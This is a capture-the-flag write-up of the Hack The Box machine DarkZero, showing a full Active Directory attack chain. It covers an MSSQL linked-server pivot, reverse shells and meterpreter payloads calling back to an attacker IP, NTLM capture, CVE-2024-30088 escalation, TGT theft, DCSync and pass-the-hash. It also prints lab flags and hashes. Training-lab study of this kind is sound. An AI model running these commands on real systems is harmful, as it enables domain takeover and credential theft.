# HTB Write-Up: DarkZero

| Field | Details |
| --- | --- |
| Platform | [Hack The Box](https://app.hackthebox.com/machines/DarkZero) |
| Difficulty | Hard |
| OS | Windows |
| Date | October 25, 2026 |

## Table of Contents

1. [Reconnaissance](#reconnaissance)
2. [Enumeration — SMB Access & Cross-Forest Trust Discovery](#enumeration-smb-access-cross-forest-trust-discovery)
3. [Lateral Movement — MSSQL Linked Server Pivot to DC02](#lateral-movement-mssql-linked-server-pivot-to-dc02)
4. [Credential Access — NTLM Capture & RCE via xp\_cmdshell](#credential-access-ntlm-capture-rce-via-xp_cmdshell)
5. [Privilege Escalation — Local Exploit Suggester & CVE-2024-30088](#privilege-escalation-local-exploit-suggester-cve-2024-30088)
6. [Cross-Forest Attack Setup — Unconstrained Delegation on DC02](#cross-forest-attack-setup-unconstrained-delegation-on-dc02)
7. [Domain Compromise — Forced Authentication, Pass-the-Ticket & DCSync](#domain-compromise-forced-authentication-pass-the-ticket-dcsync)

## Reconnaissance

Port discovery was performed with **RustScan**:

```bash
rustscan -a 10.129.89.239 --ulimit=5000
```

**Notable Open Ports:**

| Port | Service |
| --- | --- |
| 53 | DNS |
| 88 | Kerberos |
| 389 / 636 | LDAP / LDAPS |
| 445 | SMB |
| 1433 | MSSQL |
| 5985 | WinRM |
| 9389 | .NET Message Framing |

A Domain Controller for `darkzero.htb`, hostname **DC01**, running **Windows Server 2025**. **Port 1433 (MSSQL)** stands out as the extra attack surface beyond the usual AD ports, and turns out to be the key to the whole chain.

## Enumeration — SMB Access & Cross-Forest Trust Discovery

### 2.1 — SMB & SYSVOL

Given credentials (`john.w:RFulUtONCOL!`) gave standard share access:

```bash
netexec smb 10.129.89.239 -u john.w -p 'RFulUtONCOL!' --shares
```

Only the default shares were present. `SYSVOL` was browsed but held nothing of immediate interest.

### 2.2 — BloodHound & the Domain Trust

The domain was added to `/etc/hosts` and BloodHound data collected:

```bash
echo "10.129.89.239 darkzero.htb dc01.darkzero.htb" | sudo tee -a /etc/hosts
bloodhound-python -ns 10.129.89.239 -d darkzero.htb -dc dc01.darkzero.htb -u john.w -p 'RFulUtONCOL!' -c All --zip
```

The standout finding, under **Map Domain Trusts**: **`darkzero.htb`** has a trust relationship with a separate forest, **`darkzero.ext`**. Two Windows domains under one engagement means credentials or sessions on one side can potentially be leveraged to reach the other — this trust becomes the backbone of the rest of the attack chain.

## Lateral Movement — MSSQL Linked Server Pivot to DC02

### 3.1 — Connecting to MSSQL

```bash
impacket-mssqlclient darkzero.htb/john.w:'RFulUtONCOL!'@10.129.89.239 -windows-auth
```

### 3.2 — No Direct Command Execution

The usual `xp_cmdshell` route was tried and blocked outright — `john.w` lacks the rights to execute it or to enable it via `sp_configure`:

```sql
EXEC xp_cmdshell 'whoami';
-- EXECUTE permission denied
EXEC sp_configure 'show advanced options', 1;
-- permission denied
```

### 3.3 — Enumerating Linked Servers

MSSQL **linked servers** let one SQL instance query another using stored credentials. They were enumerated:

```sql
enum_links
```

```
SRV_NAME            SRV_DATASOURCE
-----------------   ------------------
DC01                DC01
DC02.darkzero.ext   DC02.darkzero.ext

Linked Server           Local Login       Remote Login
DC02.darkzero.ext       darkzero\john.w   dc01_sql_svc
```

**`DC02.darkzero.ext`** — the second forest's domain controller — is linked, and `john.w`'s queries map automatically to the **`dc01_sql_svc`** account on that side. This is the bridge across the forest trust.

### 3.4 — Pivoting to DC02

```sql
use_link [DC02.darkzero.ext]
```

With the link active, commands now run in the context of `dc01_sql_svc` on **DC02**, where `xp_cmdshell` worked without restriction:

```sql
EXEC xp_cmdshell 'whoami';
```

```
darkzero-ext\svc_sql
```

Code execution on the second forest's domain controller, as **`svc_sql`**.

## Credential Access — NTLM Capture & RCE via xp\_cmdshell

### 4.1 — Attempting a Hash Capture

With command execution confirmed, `xp_dirtree` was tried first to grab the `svc_sql` NTLMv2 hash via Responder:

```bash
sudo responder -I tun0
```

```sql
EXEC master..xp_dirtree '\\10.10.14.25\DarkZero\';
```

A hash was captured for **`darkzero-ext\svc_sql`**, but it did not crack against rockyou — the password is strong enough to resist a wordlist attack:

```bash
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
# Status: Exhausted
```

### 4.2 — Reverse Shell via xp\_cmdshell

With the hash uncrackable, the already-confirmed `xp_cmdshell` access was used directly for an interactive shell instead. A listener was opened:

```bash
rlwrap nc -nvlp 4444
```

And a base64-encoded PowerShell reverse shell executed through the SQL session:

```sql
EXEC xp_cmdshell 'powershell -e <base64-encoded reverse shell>';
```

```powershell
PS C:\Windows\system32> whoami
darkzero-ext\svc_sql
```

A confirmed interactive shell as `svc_sql` on **DC02**, ready for privilege escalation.

## Privilege Escalation — Local Exploit Suggester & CVE-2024-30088

### 5.1 — Staging a Meterpreter Payload

A meterpreter executable was generated and served over an impacket SMB server for easy transfer into the target:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.25 LPORT=4445 -f exe -o rev.exe
sudo impacket-smbserver -smb2support CompData . -username admin -password admin
```

```powershell
net use \\10.10.14.25\CompData /user:admin admin
copy \\10.10.14.25\CompData\rev.exe C:\temp\rev.exe
```

A handler caught the session:

```bash
msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.25
set LPORT 4445
run
```

```powershell
.\rev.exe
```

```
meterpreter > getuid
Server username: darkzero-ext\svc_sql
```

### 5.2 — Finding a Local Exploit

```bash
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

Several candidates came back as likely exploitable, including `bypassuac_sdclt`, `cve_2022_21999_spoolfool_privesc`, and `cve_2023_28252_clfs_driver`. **`cve_2024_30088_authz_basep`** was chosen — flagged as a confirmed version match for this exact build of Windows Server 2022/2025.

### 5.3 — Exploiting CVE-2024-30088

```bash
use windows/local/cve_2024_30088_authz_basep
set session 1
set lport 5555
set lhost 10.10.14.25
run
```

```
[+] The target appears to be vulnerable.
[+] Successfully stole winlogon handle
[*] Meterpreter session 2 opened
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### 5.4 — User Flag

```
meterpreter > shell
C:\Users\Administrator\Desktop>type user.txt
4357145d725751955c54468206165db8
```

## Cross-Forest Attack Setup — Unconstrained Delegation on DC02

SYSTEM on DC02 (`darkzero.ext`) is a strong position, but the actual target — the `user.txt`/`root.txt` pair and the real prize — sits on **DC01**, in the original `darkzero.htb` forest. The BloodHound trust finding from Section 2 is what makes crossing that boundary possible.

### 6.1 — Confirming the Trust Locally

```powershell
nltest /domain_trusts
nltest /trusted_domains
```

```
0: darkzero darkzero.htb (Direct Outbound) (Direct Inbound) (Attr: foresttrans)
1: darkzero-ext darkzero.ext (Forest Tree Root) (Primary Domain) (Native)
```

This confirms a **bidirectional** forest trust between `darkzero.htb` and `darkzero.ext`.

### 6.2 — Checking for Unconstrained Delegation

When two forests trust each other, a computer account configured for **unconstrained delegation** on one side becomes a serious liability: any user who authenticates to that computer has their full Kerberos TGT handed to it, which the computer can then reuse to impersonate that user anywhere. `userAccountControl` flag `524288` (`TRUSTED_FOR_DELEGATION`) marks an account this way, so DC02 was checked for it:

```powershell
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=524288)" -attr distinguishedName userAccountControl -limit 0
```

```
CN=DC02,OU=Domain Controllers,DC=darkzero,DC=ext    532480
```

**DC02 itself has unconstrained delegation enabled.** If DC01's own machine account (`DC01$`) can be made to authenticate to DC02, its TGT will be left sitting in DC02's memory for the taking — and a Domain Controller's machine account typically has **DCSync** rights, meaning that captured ticket is effectively a master key to the whole `darkzero.htb` domain.

### 6.3 — Staging Rubeus and Mimikatz

Two tools were needed on DC02 to carry this out: **Rubeus**, to capture and reuse the TGT, and **Mimikatz**, to perform the DCSync once that ticket is active. Both were copied over the same SMB share used earlier:

```powershell
net use \\10.10.14.25\CompData /user:admin admin
copy \\10.10.14.25\CompData\Rubeus.exe C:\temp\Rubeus.exe
copy \\10.10.14.25\CompData\mimikatz.exe C:\temp\mimikatz.exe
```

### 6.4 — Starting Rubeus in Monitor Mode

```powershell
.\Rubeus.exe monitor /interval:5 /nowrap
```

Rubeus's `monitor` mode polls the local session repeatedly (every 5 seconds here) for any new Kerberos TGT that shows up in memory, printing it straight to the console as soon as one appears. With this running, the next step was to make DC01 authenticate to this machine — at which point its TGT would land directly in this window.

## Domain Compromise — Forced Authentication, Pass-the-Ticket & DCSync

This final stage has three distinct moving parts: making **DC01** authenticate to the listening DC02, **capturing and reusing** the TGT that authentication leaves behind, and finally using that ticket's privileges to **pull every password hash in the domain**. Each step is explained in detail below.

### 7.1 — Forcing DC01 to Authenticate to DC02

The original MSSQL session as `john.w` — on **DC01**, *not* pivoted through `use_link` this time — was reused to trigger the authentication:

```bash
impacket-mssqlclient darkzero.htb/john.w:'RFulUtONCOL!'@10.129.89.239 -windows-auth
```

```sql
xp_dirtree \\DC02.darkzero.ext\ggg
```

This is the same primitive used earlier for NTLM capture, but the target this time is DC02 itself. Since DC02 has **unconstrained delegation**, when the underlying `DC01$` machine account reaches out to it, DC02 doesn't just authenticate the connection — it receives and caches a full copy of `DC01$`'s TGT, ready to be reused by anything running on DC02 with the rights to read it. Staying on DC01 for this step (rather than pivoting into DC02 via `use_link`) matters: the authentication needs to originate from DC01's own machine identity, not from a session already running on DC02.

### 7.2 — Capturing the TGT with Rubeus

Back on DC02, the Rubeus `monitor` session from Section 6.4 picked up the new ticket automatically:

```
[*] Found new TGT:
  User                  :  DC01$@DARKZERO.HTB
  EndTime               :  10/25/2026 5:24:26 PM
  RenewTill             :  11/1/2026 7:24:26 AM
  Base64EncodedTicket   :
    doIFjDCCBYigAwIBBaEDAgEW...
```

This is the Domain Controller's own machine account ticket — about as privileged as a Kerberos ticket gets.

### 7.3 — Renewing and Injecting the Ticket (Pass-the-Ticket)

The captured ticket was renewed (refreshing its validity window) and immediately injected into the current Windows logon session with Rubeus's `/ptt` (Pass-the-Ticket) flag, in one combined command:

```powershell
.\Rubeus.exe renew /ticket:<base64 ticket> /ptt /nowrap
```

**Pass-the-Ticket** means the ticket is loaded directly into the current session's Kerberos ticket cache (LSASS), so that from this point on, any tool or command run in this same session authenticates as `DC01$@DARKZERO.HTB` rather than as `svc_sql`:

```
[+] TGT renewal request successful!
[+] Ticket successfully imported!
```

### 7.4 — DCSync with Mimikatz

With `DC01$`'s identity now active in the session, **Mimikatz** was used to perform a **DCSync** attack — abusing the Directory Replication Service rights that Domain Controller machine accounts hold by default to request another DC's password data exactly as if replicating it as a peer, with no code execution on DC01 itself required:

```powershell
.\mimikatz.exe
```

```
mimikatz # lsadump::dcsync /domain:darkzero.htb /user:darkzero\Administrator
```

**Result:**

```
SAM Username         : Administrator
Credentials:
  Hash NTLM: 5917507bdf2ef2c2b0a869a1cba40726
```

The **`darkzero.htb\Administrator`** NT hash — the real Domain Admin of the original forest — recovered entirely through the trust relationship, without ever touching DC01's filesystem directly.

### 7.5 — Root Flag via Pass-the-Hash

```bash
evil-winrm -i 10.129.89.239 -u Administrator -H 5917507bdf2ef2c2b0a869a1cba40726
```

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
a3d230dc21bd8d1df795e6c52fc28849
```
